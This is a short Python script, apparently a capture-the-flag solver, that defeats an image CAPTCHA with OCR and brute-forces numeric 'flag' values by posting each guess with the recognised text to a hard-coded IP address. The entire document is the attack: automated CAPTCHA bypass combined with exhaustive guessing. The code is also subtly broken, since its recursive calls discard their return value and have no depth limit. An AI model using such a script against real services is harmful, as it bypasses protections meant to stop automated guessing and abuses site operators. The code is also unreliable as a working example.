import requests
import pytesseract
from PIL import Image
from io import BytesIO
from bs4 import BeautifulSoup


def main(url, flag):

    s = requests.Session()
    r = s.get(url)
    r.raise_for_status()  # Raise an error for bad response status
    i = Image.open(BytesIO(r.content))

    captcha_text = pytesseract.image_to_string(i)


    payload = {
        'flag': flag,
        'captcha': captcha_text,
        'submit': 'Submit'
    }

    request = s.post('http://31.220.95.27:9002/captcha1/', data=payload)

    # Parse result
    soup = BeautifulSoup(request.text, 'html.parser')
    result = soup.find('p', class_='alert-danger').text


    print(result)
    if result == "Invalid captcha":
        main(url, flag)
    elif result == "Incorrect flag.":
        main(url, flag+1)
    elif result == "None":
        main(url, flag)
    else:
        return flag


url = "http://31.220.95.27:9002/captcha.php"
flag = 1000
print(main(url, flag))